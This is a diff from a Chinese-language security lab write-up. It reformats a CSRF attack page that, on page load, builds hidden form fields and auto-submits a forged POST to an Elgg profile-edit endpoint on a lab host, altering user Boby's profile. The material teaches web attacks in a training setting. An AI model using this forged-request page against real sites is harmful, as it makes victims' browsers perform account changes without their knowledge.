@@ -275,46 +275,52 @@ sudo vim /var/www/CSRF/Attacker/csrf.html
 这里是代码：
 
 ```
-<html><body><h1>
-This page forges an HTTP POST request.
-</h1>
-<script type="text/javascript">
-function post(url,fields)
-{
-//create a <form> element.
-var p = document.createElement("form");
-//construct the form
-p.action = url;
-p.innerHTML = fields;
-p.target = "_self";
-p.method = "post";
+<html>
 
-        //append the form to the current page.
-document.body.appendChild(p);
-//submit the form
-p.submit();
-}
-function csrf_hack()
-{
-var fields;
-// The following are form entries that need to be filled out
-// by attackers. The entries are made hidden, so the victim
-// won't be able to see them.
-fields += "<input type='hidden' name='name' value='Boby'>";
-fields += "<input type='hidden' name='description' value='test'>";
-fields += "<input type='hidden' name='accesslevel[description]' value='2'>";
-fields += "<input type='hidden' name='briefdescription' value='test'>";
-fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
-fields += "<input type='hidden' name='location' value='test'>";
-fields += "<input type='hidden' name='accesslevel[location]' value='2'>";
-fields += "<input type='hidden' name='guid' value='40'>";
-var url = "http://www.csrflabelgg.com/action/profile/edit";
-post(url,fields);
-}
-// invoke csrf_hack() after the page is loaded.
-window.onload = function() { csrf_hack();}
-</script>
-</body></html>
+<body>
+    <h1>
+        This page forges an HTTP POST request.
+    </h1>
+    <script type="text/javascript">
+        function post(url, fields) {
+            //create a <form> element.
+            var p = document.createElement("form");
+            //construct the form
+            p.action = url;
+            p.innerHTML = fields;
+            p.target = "_self";
+            p.method = "post";
+
+            //append the form to the current page.
+            document.body.appendChild(p);
+            //submit the form
+            p.submit();
+        }
+
+        function csrf_hack() {
+            var fields;
+            // The following are form entries that need to be filled out
+            // by attackers. The entries are made hidden, so the victim
+            // won't be able to see them.
+            fields += "<input type='hidden' name='name' value='Boby'>";
+            fields += "<input type='hidden' name='description' value='test'>";
+            fields += "<input type='hidden' name='accesslevel[description]' value='2'>";
+            fields += "<input type='hidden' name='briefdescription' value='test'>";
+            fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
+            fields += "<input type='hidden' name='location' value='test'>";
+            fields += "<input type='hidden' name='accesslevel[location]' value='2'>";
+            fields += "<input type='hidden' name='guid' value='40'>";
+            var url = "http://www.csrflabelgg.com/action/profile/edit";
+            post(url, fields);
+        }
+        // invoke csrf_hack() after the page is loaded.
+        window.onload = function() {
+            csrf_hack();
+        }
+    </script>
+</body>
+
+</html>
 ```
 
 Boby用户访问前：
